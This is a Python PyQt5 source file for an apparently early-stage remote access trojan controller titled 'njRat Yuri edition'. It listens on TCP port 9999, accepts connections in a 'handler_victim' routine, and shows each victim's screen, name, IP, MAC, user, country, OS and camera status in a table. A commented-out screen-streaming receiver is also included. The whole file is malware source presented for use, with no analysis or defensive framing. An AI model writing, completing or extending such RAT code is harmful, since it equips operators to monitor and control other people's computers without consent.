import threading
import json
import socket
import time
import sys
#from vidstream import StreamingServer
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5.QtCore import *
from PyQt5 import QtWidgets, QtCore

class About_window(QMainWindow):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.setFixedSize(700, 350)
        self.setWindowTitle('About')
        self.setWindowIcon(QIcon('about.png'))
        #self.setStyleSheet('background: black')

        hbox = QHBoxLayout()
        group_box = QGroupBox('About', self)
        group_box.move(40,60)
        group_box.setFixedSize(130,140)
        hbox.addWidget(group_box)

        vbox = QVBoxLayout()
        text = QLabel('Description')
        vbox.addWidget(text, alignment=QtCore.Qt.AlignLeft|QtCore.Qt.AlignTop)
        group_box.setLayout(vbox)
        self.setLayout(hbox)



class MainApp(QMainWindow):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.setFixedSize(700, 330)
        self.setWindowTitle('njRat Yuri edition')
        self.setWindowIcon(QIcon('icon.png'))
        self.setContextMenuPolicy(Qt.ActionsContextMenu)
        self.hbox = QHBoxLayout()
        self.frame = QFrame(self)
        self.frame.setFrameShape(QFrame.StyledPanel)
        self.frame.setLineWidth(3)
        self.frame.setStyleSheet('background-color: black')
        self.frame.move(0, 300)
        self.frame.setFixedSize(700, 31)
        self.hbox.addWidget(self.frame)
        self.setLayout(self.hbox)
        self.about_window = About_window(self)
        self.init_ui()
        self.show()
        self.set_server_settings()
        threading.Thread(target=self.connection_handler).start()

    def init_ui(self):
        self.table = QtWidgets.QTableWidget(0,8, self)
        header = self.table.horizontalHeader()
        self.table.move(0,0)
        self.table.resize(700,300)



        self.table.setStyleSheet(
                                'QTableView{background-color: black}'
                                'QTableView::item{background: black; color: #05a325; border-left: 1px solid #05a325; border-bottom: 1px solid #05a325;}'
                                'QTableView::item:selected{background-color: #0bbf29; color: black;}'
                                 )

        self.table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.table.verticalHeader().hide()
        self.table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.table.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.table.horizontalHeader().setHighlightSections(False)
        self.table.setHorizontalHeaderLabels([' Screen', ' Name', ' Ip', ' MAC' ,' User', ' Country', ' OS', ' Cam'])
        self.table.horizontalHeader().setFont(QFont('Arial', 9, QFont.Bold))
        self.table.horizontalHeader().setDefaultAlignment(Qt.AlignLeft|Qt.AlignVCenter)
        self.table.horizontalHeader().setMinimumHeight(35)
        self.table.horizontalHeader().setStyleSheet('QHeaderView::section{'
                                                    'background-color: black;'
                                                    'color: #05a325;'
                                                    'border: none;'
                                                    'border-bottom: 2px solid #05a325;'
                                                    'border-right: 1px solid #05a325;'
                                                    'border-left: 1px solid #05a325;'
                                                    '}')

        self.table.setColumnWidth(0, 75)
        self.table.setColumnWidth(1, 150)
        self.table.setColumnWidth(2, 105)
        self.table.setColumnWidth(3, 120)
        self.table.setColumnWidth(4, 90)
        self.table.setColumnWidth(5, 70)
        self.table.setColumnWidth(6, 100)
        self.table.setColumnWidth(7, 60)


        header.setSectionResizeMode(0, QtWidgets.QHeaderView.Fixed)
        header.setSectionResizeMode(1, QtWidgets.QHeaderView.Fixed)
        header.setSectionResizeMode(2, QtWidgets.QHeaderView.Fixed)
        header.setSectionResizeMode(3, QtWidgets.QHeaderView.Fixed)
        header.setSectionResizeMode(4, QtWidgets.QHeaderView.Fixed)
        header.setSectionResizeMode(5, QtWidgets.QHeaderView.Fixed)
        header.setSectionResizeMode(6, QtWidgets.QHeaderView.Fixed)
        header.setSectionResizeMode(7, QtWidgets.QHeaderView.Fixed)


        about_label = QLabel('[About]', self.frame)
        about_label.setStyleSheet('color: white')
        about_label.move(9,7)
        about_label.mousePressEvent = self.about

        self.ntRightClickMenu = QMenu(self)
        self.action = QAction('Test', self)
        self.ntRightClickMenu.addAction(self.action)
        self.action.triggered.connect(self.print_hello)
        self.table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.table.customContextMenuRequested.connect(self.showNTContextMenu)



        self.table.show()




    def about(self, event):
        self.about_window.show()

    def set_server_settings(self):
        ip = socket.gethostbyname(socket.gethostname())
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((ip, 9999))
        self.server.listen()


    def connection_handler(self):
        self.connection_counter = 0
        self.connection_id_table = 0
        while True:
           self.connection_counter += 1
           self.connection_id_table += 1
           connection, addr = self.server.accept()
           threading.Thread(target=self.handler_victim, args=(connection, self.connection_id_table)).start()


    def handler_victim(self, connection, connection_id_table):
        #self.print_hello('1')
        while True:
            try:
               data = connection.recv(4096000)
               if not data:
                  self.table.removeRow(connection_id_table-1)
                  self.connection_counter -= 1
                  self.connection_id_table -= 1
                  self.table.setRowCount(self.connection_counter-1)
                  #connection.send(b'something')
                  break
               data = json.loads(data.decode())
               threading.Thread(target=self.write_data_to_table, args=(self.connection_id_table, data, self.connection_counter)).start()
               self.table.selectRow(connection_id_table - 1)
            except ConnectionResetError:
                self.table.removeRow(connection_id_table - 1)
                self.connection_counter -= 1
                self.connection_id_table -= 1
                self.table.setRowCount(self.connection_counter - 1)


        connection.close()

    def write_data_to_table(self, table_id, data, connection_counter):
        self.table.setRowCount(connection_counter-1)
        for i in range(8):
            self.table.setItem(table_id-2, i, QTableWidgetItem(str(data[i])))


    def showNTContextMenu(self, pos):
        curRow = self.table.currentRow()
        if curRow == -1:
            return
        self.ntRightClickMenu.exec_(self.table.mapToGlobal(pos))

    def print_hello(self):
        # curRow = self.table.currentRow()
        # if curRow == -1:
        #    return
        print("1")




if __name__ == '__main__':

    app = QApplication(sys.argv)
    main_app = MainApp()
    sys.exit(app.exec())


# reciver = StreamingServer('192.168.1.103', 1234)
#
# thread = threading.Thread(target=reciver.start_server)
# thread.start()